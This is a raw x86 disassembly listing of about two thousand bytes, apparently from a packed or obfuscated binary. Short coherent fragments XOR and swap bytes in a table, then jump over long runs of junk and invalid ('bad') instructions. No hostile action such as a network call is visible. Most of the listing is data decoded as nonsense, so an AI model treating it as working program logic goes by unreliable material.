  404a88:	mov    ds:0x8b1684e9,eax
  404a8d:	sar    DWORD PTR [edx+0x59d944a7],1
  404a93:	push   esp
  404a94:	dec    eax
  404a95:	mov    edi,0x93b63d52
  404a9a:	sub    BYTE PTR [edx+0x60],0x3
  404a9e:	fmul   QWORD PTR [eax-0x7f]
  404aa1:	push   0x3
  404aa3:	adc    eax,0x45c7ca11
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x23c6a28
  404b32:	stc    
  404b33:	xor    edx,ecx
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b97
  404b3e:	js     0x404b43
  404b40:	xchg   ebx,eax
  404b41:	je     0x404af1
  404b43:	mov    esi,DWORD PTR [edi]
  404b45:	fmul   DWORD PTR [edx-0x56]
  404b48:	xchg   edx,eax
  404b49:	pop    eax
  404b4a:	(bad)  
  404b4b:	fs or  eax,0xc9246b13
  404b51:	mov    edi,0x2ebca9db
  404b56:	add    eax,0x9511069c
  404b5b:	push   ebx
  404b5c:	mov    ch,0x8
  404b5e:	mov    edx,0xd46670be
  404b63:	scas   al,BYTE PTR es:[edi]
  404b64:	stos   BYTE PTR es:[edi],al
  404b65:	cmp    DWORD PTR [ebx+0x46ca59ec],ebx
  404b6b:	aas    
  404b6c:	mov    esp,0xb9137df2
  404b71:	jp     0x404b58
  404b73:	jmp    0x404bc5
  404b75:	pop    esi
  404b76:	mov    dl,0x3b
  404b78:	mov    ebp,0x8e993e79
  404b7d:	sbb    al,0xe7
  404b7f:	jno    0x404b92
  404b81:	call   0x7278:0x95781300
  404b88:	not    BYTE PTR [edi+0xa]
  404b8b:	pusha  
  404b8c:	mov    dl,BYTE PTR [edi+0x622ad0a9]
  404b92:	dec    edi
  404b93:	jecxz  0x404c0d
  404b95:	push   edx
  404b96:	xchg   esi,eax
  404b97:	dec    ebp
  404b98:	enter  0x925b,0xdc
  404b9c:	rcr    DWORD PTR [ebx],0x93
  404b9f:	xor    DWORD PTR [ebp+0x53563738],ebx
  404ba5:	ins    DWORD PTR es:[edi],dx
  404ba6:	nop
  404ba7:	loope  0x404bc9
  404ba9:	call   0x40e8:0x450a2ebd
  404bb0:	pop    edi
  404bb1:	dec    edx
  404bb2:	iret   
  404bb3:	push   0xffffffe0
  404bb5:	pop    edx
  404bb6:	mov    edi,0xe17a0ff4
  404bbb:	call   0xaaf4:0x9c520171
  404bc2:	mov    ds,WORD PTR [ebx+0x44bdd54c]
  404bc8:	icebp  
  404bc9:	inc    eax
  404bca:	mov    bl,0xf4
  404bcc:	push   esp
  404bcd:	cmp    ebp,edi
  404bcf:	ret    
  404bd0:	or     eax,0xbdfd22a2
  404bd5:	inc    esp
  404bd6:	icebp  
  404bd7:	jnp    0x404c19
  404bd9:	xor    al,0xbb
  404bdb:	lds    eax,FWORD PTR [eax+ebx*4]
  404bde:	lahf   
  404bdf:	adc    DWORD PTR [ebx],ecx
  404be1:	scas   al,BYTE PTR es:[edi]
  404be2:	stc    
  404be3:	inc    ebx
  404be4:	fist   WORD PTR [esp+eax*2-0x2920f88b]
  404beb:	lahf   
  404bec:	jno    0x404bdd
  404bee:	fist   WORD PTR [edx+0x5a]
  404bf1:	loopne 0x404c5d
  404bf3:	inc    edx
  404bf4:	inc    ebp
  404bf5:	into   
  404bf6:	push   ebx
  404bf7:	xchg   esi,eax
  404bf8:	pop    esp
  404bf9:	sbb    eax,0x3264eb6f
  404bfe:	les    ebx,FWORD PTR [eax-0x41]
  404c01:	ret    0x650f
  404c04:	sbb    al,0xb
  404c06:	jmp    0x404c19
  404c08:	in     al,dx
  404c09:	mov    bh,0x67
  404c0b:	xor    DWORD PTR [esi-0x26c8ac92],esi
  404c11:	(bad)  
  404c12:	and    BYTE PTR [eax],dh
  404c14:	leave  
  404c15:	ds jecxz 0x404bcf
  404c18:	rcl    dl,1
  404c1a:	fs retf 
  404c1c:	dec    ebp
  404c1d:	(bad)  
  404c1e:	sbb    ch,ah
  404c20:	mov    ebp,0xeaac5589
  404c25:	out    0xba,al
  404c27:	mov    al,ds:0xc48da149
  404c2c:	xchg   BYTE PTR [esp+ebp*8],bh
  404c2f:	adc    ah,bl
  404c31:	mov    ecx,0x9816daf7
  404c36:	add    al,0x23
  404c38:	sbb    BYTE PTR [ebx+0x3f],ch
  404c3b:	jmp    0xbd15d567
  404c40:	add    dh,BYTE PTR [edi]
  404c42:	xchg   ebp,eax
  404c43:	arpl   WORD PTR [edx],bx
  404c45:	push   ebp
  404c46:	xor    DWORD PTR [eax+0x1],0x7c
  404c4a:	mov    al,0xbe
  404c4c:	xchg   esi,eax
  404c4d:	int3   
  404c4e:	(bad)  
  404c4f:	xchg   esi,eax
  404c50:	int    0x0
  404c52:	jmp    0xd839:0x68a882ba
  404c59:	(bad)  
  404c5a:	dec    edx
  404c5b:	test   BYTE PTR ds:0x2b3f7f2f,0xc9
  404c62:	jg     0x404c29
  404c64:	inc    ecx
  404c65:	mov    al,ds:0x1d617035
  404c6a:	dec    edi
  404c6b:	jne    0x404c41
  404c6d:	mov    ah,0x7a
  404c6f:	in     eax,dx
  404c70:	push   esi
  404c71:	jno    0x404ca2
  404c73:	sti    
  404c74:	loope  0x404cbf
  404c76:	jae    0x404bfb
  404c78:	cld    
  404c79:	sbb    bh,bh
  404c7b:	stos   DWORD PTR es:[edi],eax
  404c7c:	jmp    FWORD PTR [edx-0x6]
  404c7f:	sub    esp,0x4c
  404c82:	cmp    ebx,DWORD PTR [ecx+0x74]
  404c85:	lods   al,BYTE PTR ds:[esi]
  404c86:	add    DWORD PTR [esi],ebx
  404c88:	xchg   ebx,eax
  404c89:	adc    DWORD PTR [edi+0x57e5c694],ebx
  404c8f:	pushf  
  404c90:	mov    bh,0xce
  404c92:	dec    eax
  404c93:	nop
  404c94:	sbb    eax,DWORD PTR [ecx+0xfa7f0c5]
  404c9a:	loop   0x404c70
  404c9c:	and    ah,BYTE PTR [edi-0x1ab634ca]
  404ca2:	inc    ebx
  404ca3:	sub    DWORD PTR [edx],0x71e369fb
  404ca9:	clc    
  404caa:	xchg   edx,eax
  404cab:	int3   
  404cac:	push   ds
  404cad:	or     al,0xee
  404caf:	sbb    eax,0xa4be02ff
  404cb4:	jne    0x404d31
  404cb6:	dec    edi
  404cb7:	add    edi,eax
  404cb9:	adc    esp,DWORD PTR [ecx]
  404cbb:	cwde   
  404cbc:	cwde   
  404cbd:	icebp  
  404cbe:	ss adc eax,0xe933f7ac
  404cc4:	sbb    eax,0x3598726b
  404cc9:	jns    0x404cbf
  404ccb:	sahf   
  404ccc:	mov    ebp,0x1459f60e
  404cd1:	mov    edx,DWORD PTR [edx-0x53]
  404cd4:	fisub  DWORD PTR [ebx-0x58f37a8d]
  404cda:	and    eax,0xfea51406
  404cdf:	xchg   edx,eax
  404ce0:	nop
  404ce1:	in     eax,dx
  404ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ce3:	mov    esi,ebx
  404ce5:	fild   QWORD PTR [ecx]
  404ce7:	sbb    BYTE PTR [edi-0x9f40c1c],dl
  404ced:	(bad)  
  404cee:	scas   eax,DWORD PTR es:[edi]
  404cef:	daa    
  404cf0:	pop    eax
  404cf1:	aas    
  404cf2:	cwde   
  404cf3:	(bad)  
  404cf4:	cmp    al,0x8e
  404cf6:	pop    ebx
  404cf7:	frstor fs:[esi+0x194a5927]
  404cfe:	aam    0xa1
  404d00:	inc    ebx
  404d01:	push   esi
  404d02:	cli    
  404d03:	xor    edx,DWORD PTR [ebx-0x22c2c4e8]
  404d09:	add    al,BYTE PTR [edx+0x7e488cd7]
  404d0f:	xchg   edi,eax
  404d10:	xchg   ebp,eax
  404d11:	icebp  
  404d12:	mov    eax,ds:0x9ed4d1d6
  404d17:	sbb    ebx,ecx
  404d19:	inc    esi
  404d1a:	mov    ebp,0xc5831c13
  404d1f:	fld    TBYTE PTR [ecx-0x23446cc4]
  404d25:	or     eax,0xd89c05a6
  404d2a:	and    DWORD PTR [ebx-0xe351990],esp
  404d30:	and    eax,0x1ed6d41f
  404d35:	mov    ch,0x2
  404d37:	outs   dx,DWORD PTR ds:[esi]
  404d38:	xchg   DWORD PTR es:[esi+0x147d26af],edi
  404d3f:	pop    edi
  404d40:	call   0xd9d9:0xaa894c16
  404d47:	mov    al,ds:0xdc48a910
  404d4c:	stos   DWORD PTR es:[edi],eax
  404d4d:	jnp    0x404cf4
  404d4f:	cs (bad) 
  404d51:	and    esi,DWORD PTR [esi]
  404d53:	mov    WORD PTR [esi-0x25],?
  404d56:	popf   
  404d57:	dec    edi
  404d58:	adc    bl,BYTE PTR [esi+ebp*1]
  404d5b:	(bad)  
  404d5c:	push   edx
  404d5d:	jmp    0x3837092f
  404d62:	pop    edi
  404d63:	push   edx
  404d64:	jle    0x404cf9
  404d66:	and    BYTE PTR [esi+0x7f],cl
  404d69:	inc    edi
  404d6a:	xor    BYTE PTR [eax],ch
  404d6c:	mov    ch,ah
  404d6e:	iret   
  404d6f:	test   eax,0x2c67124f
  404d74:	sbb    edx,eax
  404d76:	punpckldq mm7,DWORD PTR [ebp+0x7d]
  404d7a:	fs pushf 
  404d7c:	inc    edx
  404d7d:	jb     0x404dc5
  404d7f:	imul   esi,DWORD PTR [esi+0x3c428a90],0x3fc719a0
  404d89:	cmp    al,0x8
  404d8b:	push   esi
  404d8c:	fstp   QWORD PTR [eax+0x4a2dfc88]
  404d92:	push   edx
  404d93:	ds jbe 0x404d3b
  404d96:	sbb    dh,BYTE PTR [edi]
  404d98:	int    0x6c
  404d9a:	xchg   edi,eax
  404d9b:	xchg   edi,eax
  404d9c:	std    
  404d9d:	leave  
  404d9e:	push   ebx
  404d9f:	fldcw  WORD PTR [eax]
  404da1:	out    0x6b,eax
  404da3:	adc    BYTE PTR [esi+0x12],ch
  404da6:	jo     0x404d3e
  404da8:	neg    bh
  404daa:	and    eax,0x95e59f8f
  404daf:	add    BYTE PTR [ecx+eiz*8+0x8],ah
  404db3:	ret    0xb6ec
  404db6:	ret    
  404db7:	ins    DWORD PTR es:[edi],dx
  404db8:	shl    bh,0xc0
  404dbb:	pop    DWORD PTR [edx+0x3db9ad22]
  404dc1:	inc    ecx
  404dc2:	dec    eax
  404dc3:	cmp    ebx,edx
  404dc5:	loopne 0x404dd1
  404dc7:	stos   BYTE PTR es:[edi],al
  404dc8:	in     eax,dx
  404dc9:	jmp    0x404e02
  404dcb:	lock dec ebx
  404dcd:	jecxz  0x404e39
  404dcf:	clc    
  404dd0:	loopne 0x404e04
  404dd2:	pop    ss
  404dd3:	and    al,0xf5
  404dd5:	mov    DWORD PTR [ecx],ecx
  404dd7:	(bad)  
  404dd8:	cmp    edi,DWORD PTR [esi-0x189f91d]
  404dde:	jle    0x404d82
  404de0:	jae    0x404db9
  404de2:	in     al,dx
  404de3:	and    al,0x4d
  404de5:	jne    0x404e40
  404de7:	push   ss
  404de8:	pop    esp
  404de9:	cmp    eax,0x174934c5
  404dee:	push   ss
  404def:	and    eax,0x2ea96ed
  404df4:	pop    esi
  404df5:	mov    ebx,0xa2812266
  404dfa:	ss mov cl,0x21
  404dfd:	lahf   
  404dfe:	pop    esi
  404dff:	adc    BYTE PTR [esi],bl
  404e01:	pop    esp
  404e02:	or     eax,0xcddd7fba
  404e07:	retf   
  404e08:	les    esp,FWORD PTR [edi-0x17]
  404e0b:	xchg   esi,eax
  404e0c:	(bad)  
  404e0e:	push   0xf993e5ad
  404e13:	js     0x404e08
  404e15:	ja     0x404dc1
  404e17:	cdq    
  404e18:	jge    0x404e28
  404e1a:	sub    ch,BYTE PTR ds:0x62308dde
  404e20:	cmc    
  404e21:	mov    bh,0x38
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e09
  404e5e:	sub    eax,0x218c8967
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e05
  404e6a:	ret    
  404e6b:	out    0xb2,eax
  404e6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e6e:	mov    BYTE PTR [esi],bl
  404e70:	xchg   ecx,eax
  404e71:	and    DWORD PTR [esp+eiz*8-0x2f],ebp
  404e75:	jle    0x404e66
  404e77:	and    ebx,DWORD PTR [ecx+0x7a]
  404e7a:	mov    dl,0x76
  404e7c:	std    
  404e7d:	adc    eax,0xa1ecadb
  404e82:	iret   
  404e83:	shl    DWORD PTR [ecx-0x7c],1
  404e86:	pop    es
  404e87:	das    
  404e88:	test   eax,0x209436a3
  404e8d:	cmc    
  404e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e8f:	outs   dx,BYTE PTR ds:[esi]
  404e90:	call   0x2abdda16
  404e95:	push   edi
  404e96:	aaa    
  404e97:	pop    es
  404e98:	mov    esp,0x93e95c76
  404e9d:	pop    es
  404e9e:	jecxz  0x404e3d
  404ea0:	mov    esi,0x1b59a195
  404ea5:	cmp    eax,0x524254ef
  404eaa:	les    esp,FWORD PTR [edi-0xd]
  404ead:	adc    ebx,DWORD PTR [eax-0x4cb8b0ee]
  404eb3:	mov    WORD PTR [edx+ebx*2+0x4e8eb0f7],gs
  404eba:	daa    
  404ebb:	push   ss
  404ebc:	mov    esp,fs
  404ebe:	inc    edi
  404ebf:	mov    edi,0x12fde742
  404ec4:	push   ss
  404ec5:	jle    0x404f34
  404ec7:	adc    al,0x2a
  404ec9:	cmp    cl,dh
  404ecb:	aam    0x44
  404ecd:	add    DWORD PTR [esi],esi
  404ecf:	push   0x31
  404ed1:	bound  esi,QWORD PTR [eax-0x50]
  404ed4:	xor    ah,dl
  404ed6:	jmp    0x404e99
  404ed8:	ror    dh,1
  404eda:	push   edi
  404edb:	sbb    BYTE PTR [edx],bl
  404edd:	fwait
  404ede:	pusha  
  404edf:	inc    edi
  404ee0:	sbb    bl,BYTE PTR [esi]
  404ee2:	mov    ecx,0x1c5f6f09
  404ee7:	fwait
  404ee8:	stos   DWORD PTR es:[edi],eax
  404ee9:	clc    
  404eea:	sahf   
  404eeb:	sbb    al,0x6c
  404eed:	jno    0x404eb0
  404eef:	sub    ch,bl
  404ef1:	repnz test DWORD PTR [eax+ecx*1],edi
  404ef5:	jmp    0x799a:0xfc5a5dc3
  404efc:	mov    cl,0x13
  404efe:	mov    esp,0x72463d5c
  404f03:	adc    esi,DWORD PTR [esi+0x36e54f2b]
  404f09:	sahf   
  404f0a:	repz cdq 
  404f0c:	inc    DWORD PTR [edi-0x45]
  404f0f:	add    eax,0x67621f25
  404f14:	pushf  
  404f15:	outs   dx,DWORD PTR ds:[esi]
  404f16:	popf   
  404f17:	mov    esi,ds
  404f19:	imul   BYTE PTR [esi]
  404f1b:	adc    DWORD PTR [edi+0x79],ebp
  404f1e:	enter  0x4108,0xcf
  404f22:	sub    eax,0xfcd61c6
  404f27:	mov    edi,0x2d719d6
  404f2c:	jg     0xb6cd0723
  404f32:	aad    0x9d
  404f34:	repz scas eax,DWORD PTR es:[edi]
  404f36:	out    dx,al
  404f37:	sub    esp,DWORD PTR [esi]
  404f39:	add    eax,0xd5416039
  404f3e:	sub    ecx,DWORD PTR [esi-0x2d]
  404f41:	imul   ebx,DWORD PTR [ebx+eiz*8],0x36110f0c
  404f48:	inc    esp
  404f49:	or     DWORD PTR [edx+edx*4],edx
  404f4c:	into   
  404f4d:	das    
  404f4e:	std    
  404f4f:	scas   eax,DWORD PTR es:[edi]
  404f50:	sti    
  404f51:	xchg   esi,eax
  404f52:	call   0x58f6b323
  404f57:	mov    dh,0x11
  404f59:	dec    ebp
  404f5a:	mov    DWORD PTR [edi-0x43],eax
  404f5d:	dec    esi
  404f5e:	inc    ebx
  404f5f:	loope  0x404fbe
  404f61:	outs   dx,BYTE PTR ds:[esi]
  404f62:	dec    esi
  404f63:	mov    ds:0x29cd0bd,eax
  404f68:	dec    edi
  404f69:	stos   BYTE PTR es:[edi],al
  404f6a:	xchg   edi,eax
  404f6b:	scas   eax,DWORD PTR es:[edi]
  404f6c:	sub    al,0x1e
  404f6e:	mov    eax,0x4fce9aa6
  404f73:	js     0x404efd
  404f75:	lahf   
  404f76:	rcl    DWORD PTR [edx],1
  404f78:	push   0xffffffa5
  404f7a:	daa    
  404f7b:	cmp    ecx,DWORD PTR [edi+0x30399418]
  404f81:	push   ebp
  404f82:	(bad)  
  404f83:	test   eax,0xab2ff2a1
  404f88:	push   es
  404f89:	cmp    eax,0x8ea23aed
  404f8e:	pushf  
  404f8f:	inc    ebp
  404f90:	addr16 in al,dx
  404f92:	icebp  
  404f93:	sbb    DWORD PTR [ecx+0x59],edx
  404f96:	push   ebx
  404f97:	jb     0x404ff6
  404f99:	cmp    BYTE PTR [ebp+eax*2+0x50],0xec
  404f9e:	dec    esp
  404f9f:	jb     0x404ffc
  404fa1:	mov    ds:0x8ab4a416,al
  404fa6:	xor    bl,ah
  404fa8:	add    ah,bl
  404faa:	pop    ss
  404fab:	inc    ecx
  404fac:	mov    eax,ds:0x5641d003
  404fb1:	or     eax,0xfaad65cd
  404fb6:	mov    dl,0xcd
  404fb8:	loop   0x404fe6
  404fba:	enter  0x365c,0xb5
  404fbe:	sbb    esi,DWORD PTR [edi-0x10]
  404fc1:	add    esi,DWORD PTR [ecx]
  404fc3:	cmp    eax,0x609ae7b4
  404fc8:	enter  0x47a2,0x8b
  404fcc:	call   0x35ca:0xb21ed895
  404fd3:	icebp  
  404fd4:	xchg   edx,eax
  404fd5:	mov    ecx,0x8f21fa31
  404fda:	arpl   WORD PTR [ebx],bp
  404fdc:	into   
  404fdd:	cs ins DWORD PTR es:[edi],dx
  404fdf:	enter  0x3d8a,0xc1
  404fe3:	ficomp DWORD PTR [ebp+0x1f]
  404fe6:	sub    cl,BYTE PTR [ebx+0x5b44f29d]
  404fec:	je     0x404fcf
  404fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fef:	dec    ebx
  404ff0:	(bad)  
  404ff2:	inc    ecx
  404ff3:	enter  0xc410,0x81
  404ff7:	inc    eax
  404ff8:	jmp    0x31872f7b
  404ffd:	pop    esi
  404ffe:	imul   edx,DWORD PTR [ecx+0x768a2663],0x7a5771a7
  405008:	jbe    0x404f92
  40500a:	ror    DWORD PTR [esp+esi*1],1
  40500d:	jbe    0x405033
  40500f:	in     eax,0xe1
  405011:	xchg   edx,eax
  405012:	outs   dx,DWORD PTR ds:[esi]
  405013:	xchg   ebx,eax
  405014:	imul   edx,eax,0xffffffa1
  405017:	mov    ebp,0x9c48baad
  40501c:	push   ebx
  40501d:	stc    
  40501e:	sbb    al,0x6f
  405020:	jge    0x405044
  405022:	fidiv  DWORD PTR [eax]
  405024:	jmp    0xd28f4cf9
  405029:	addr16 add eax,0xeac32ee5
  40502f:	inc    edi
  405030:	cmp    eax,0x2fa9b551
  405035:	push   eax
  405036:	fistp  WORD PTR [esi-0x35d7cbea]
  40503c:	ror    DWORD PTR [esi+esi*1],1
  40503f:	mov    edi,0xc4a9dc98
  405044:	sbb    DWORD PTR [ebx],0x82cf057b
  40504a:	repz dec ebp
  40504c:	scas   al,BYTE PTR es:[edi]
  40504d:	outs   dx,DWORD PTR ds:[esi]
  40504e:	cdq    
  40504f:	ss jns 0x4050b5
  405052:	daa    
  405053:	add    eax,0x360aefbe
  405058:	dec    edx
  405059:	or     DWORD PTR [edx+0x6],ebp
  40505c:	out    0xe7,al
  40505e:	jg     0x405063
  405060:	iret   
  405061:	lahf   
  405062:	mov    bh,0x77
  405064:	mov    ch,bl
  405066:	mov    esi,0x48bcc82e
  40506b:	syscall 
  40506d:	retf   
  40506e:	adc    BYTE PTR [edx+0x77],bh
  405071:	or     edi,esi
  405073:	or     bl,BYTE PTR [ecx-0x66873eb9]
  405079:	mul    DWORD PTR [edi]
  40507b:	push   0xffffffaa
  40507d:	test   BYTE PTR [eax],bl
  40507f:	sbb    eax,DWORD PTR [ecx+eiz*4+0x7f]
  405083:	fbld   TBYTE PTR [ecx-0x2]
  405086:	xor    ebx,DWORD PTR [eax]
  405088:	mov    eax,0x52f20aa9
  40508d:	fild   WORD PTR [edx+0x298eabad]
  405093:	loop   0x405076
  405095:	inc    eax
  405096:	pop    ebp
  405097:	retf   
  405098:	adc    edi,esp
  40509a:	mov    ah,0x6f
  40509c:	mov    ebp,0x8268487c
  4050a1:	not    cl
  4050a3:	mov    ebx,0x2ea22676
  4050a8:	sbb    ah,BYTE PTR [ebx-0x561cda36]
  4050ae:	sbb    DWORD PTR [ebx+edx*8],0xc5b090af
  4050b5:	push   edi
  4050b6:	sub    bl,BYTE PTR [ebp+0x72823170]
  4050bc:	lods   eax,DWORD PTR ds:[esi]
  4050bd:	or     eax,0x30aa5ba0
  4050c2:	or     BYTE PTR [ebx+0xfdbb175],0x65
  4050c9:	mov    esi,DWORD PTR [ecx-0x4a4bb0a3]
  4050cf:	mov    al,ds:0x690ac58d
  4050d4:	lods   al,BYTE PTR ds:[esi]
  4050d5:	pushf  
  4050d6:	push   0xf2999bf1
  4050db:	arpl   WORD PTR [eax+esi*8+0x4f],cx
  4050df:	mov    esp,0xb14aef54
  4050e4:	fldpi  
  4050e6:	call   0x56dc402d
  4050eb:	imul   esp,DWORD PTR [edi-0x25],0xb08b9fec
  4050f2:	shr    DWORD PTR [esi+0x70da72e1],0x4
  4050f9:	repz pop eax
  4050fb:	xchg   al,ah
  4050fd:	in     al,0xb8
  4050ff:	(bad)
  405102:	jl     0x405148
  405104:	out    dx,eax
  405105:	jmp    0x4050bd
  405107:	call   0x1a9f:0x72d5b4d0
  40510e:	dec    ebx
  40510f:	imul   ecx,DWORD PTR [ebx],0xfffffff1
  405112:	mov    ?,WORD PTR [ebx]
  405114:	inc    edi
  405115:	(bad)  
  405116:	mov    edx,0xe147ee14
  40511b:	neg    BYTE PTR [edx-0x68]
  40511e:	adc    al,0xed
  405120:	loop   0x405100
  405122:	fcmovbe st,st(2)
  405124:	clc    
  405125:	in     al,dx
  405126:	dec    eax
  405127:	mov    ecx,0x281931a1
  40512c:	psrlw  mm1,mm5
  40512f:	jbe    0x4050f7
  405131:	or     ecx,DWORD PTR [edi+ebx*1-0x1d932ae9]
  405138:	fdivr  DWORD PTR [esi+0x6d655209]
  40513e:	adc    ebx,DWORD PTR [ebp-0x2d]
  405141:	or     al,0x84
  405143:	bound  ebp,QWORD PTR [eax-0x6b72d658]
  405149:	xor    BYTE PTR [ebx+0x33],bh
  40514c:	or     eax,0xaf0f0b94
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	dec    edi
  405172:	rol    dl,0xae
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051dd
  40517e:	shr    DWORD PTR [esi-0x1f20c9af],1
  405184:	ins    DWORD PTR es:[edi],dx
  405185:	jno    0x4051af
  405187:	jbe    0x40515a
  405189:	ret    
  40518a:	outs   dx,DWORD PTR ds:[esi]
  40518b:	lds    ecx,FWORD PTR [edx-0x330ebd42]
  405191:	cmp    BYTE PTR [eax+edi*4-0x30],al
  405195:	ret    0x8649
  405198:	inc    esi
  405199:	add    BYTE PTR ds:0xe9ed8bb2,ch
  40519f:	adc    edi,edi
  4051a1:	dec    eax
  4051a2:	jns    0x4051f6
  4051a4:	lods   al,BYTE PTR ds:[esi]
  4051a5:	iret   
  4051a6:	pop    es
  4051a7:	std    
  4051a8:	add    al,0xf7
  4051aa:	add    BYTE PTR [edx-0x52e6f0fa],ch
  4051b0:	bound  ecx,QWORD PTR [esi-0x47b18b8f]
  4051b6:	std    
  4051b7:	neg    DWORD PTR ds:0xd48632a4
  4051bd:	lahf   
  4051be:	or     al,0x62
  4051c0:	outs   dx,DWORD PTR ds:[esi]
  4051c1:	in     eax,0x9f
  4051c3:	int    0xdb
  4051c5:	ds cmc 
  4051c7:	fs xor esp,0x76
  4051cb:	and    ah,BYTE PTR [ebx-0x74]
  4051ce:	cmp    esp,DWORD PTR [edx-0x58]
  4051d1:	xchg   ebp,eax
  4051d2:	jnp    0x405227
  4051d4:	xchg   esp,eax
  4051d5:	mov    bl,ch
  4051d7:	ror    cl,1
  4051d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051da:	mov    cl,0xe5
  4051dc:	dec    eax
  4051dd:	mov    bh,0xd
  4051df:	lods   eax,DWORD PTR ds:[esi]
  4051e0:	and    al,0xe4
  4051e2:	jmp    0x94ded5e5
  4051e7:	mov    ebx,0xc8d72297
  4051ec:	aaa    
  4051ed:	fcom   DWORD PTR ds:0xf0915ef9
  4051f3:	mov    esi,0x9cbc2777
  4051f8:	xchg   ebx,eax
  4051f9:	sub    eax,0x1933d932
  4051fe:	push   0x53
  405200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405201:	je     0x4051ad
  405203:	adc    ebp,eax
  405205:	(bad)  
  405206:	add    BYTE PTR [ebx+ecx*4+0x22],bh
  40520a:	adc    ebp,DWORD PTR [eax]
  40520c:	pop    ebp
  40520d:	leave  
  40520e:	lods   al,BYTE PTR ds:[esi]
  40520f:	pop    ds
  405210:	es std 
  405212:	mov    dl,0xb4
  405214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405215:	or     al,BYTE PTR [ebx]
  405217:	sbb    bl,BYTE PTR [edx]
  405219:	mov    ah,0x9d
  40521b:	pop    esi
  40521c:	push   esp
  40521d:	jns    0x405203
  40521f:	add    cl,BYTE PTR [eax]
  405221:	or     eax,0xfc94c1e7
  405226:	bnd jnp 0x4052a4
  405229:	cs ss mov al,0xb1
  40522d:	arpl   si,ax
  40522f:	mov    ebp,0x7e0e61c3
  405234:	les    esp,FWORD PTR [esi+0x5285f345]
  40523a:	sbb    DWORD PTR [ebx-0x3bc87a2e],eax
  405240:	stos   BYTE PTR es:[edi],al
  405241:	cmc    
  405242:	push   ss
  405243:	sahf   
  405244:	mov    cl,0x17
  405246:	dec    BYTE PTR [eax+0x4d]
  405249:	ds (bad) 
  40524b:	sar    BYTE PTR [eax-0x3a440ed0],1
  405251:	out    0x66,eax
  405253:	js     0x405266
  405255:	call   0x96154ee1
  40525a:	jecxz  0x4052d1
  40525c:	sti    
  40525d:	pop    esi
  40525e:	xor    eax,0xb04109b1
  405263:	jle    0x4052ce
  405265:	iret   
  405266:	jp     0x405277
  405268:	inc    ecx
  405269:	test   DWORD PTR [edi+0x69],0x7b609b62
  405270:	daa    
  405271:	arpl   sp,bx
  405273:	cmp    eax,0x2ee5df1
  405278:	sbb    al,0x26
  40527a:	jno    0x4052ea
  40527c:	fisubr WORD PTR ds:0x88ee1d33
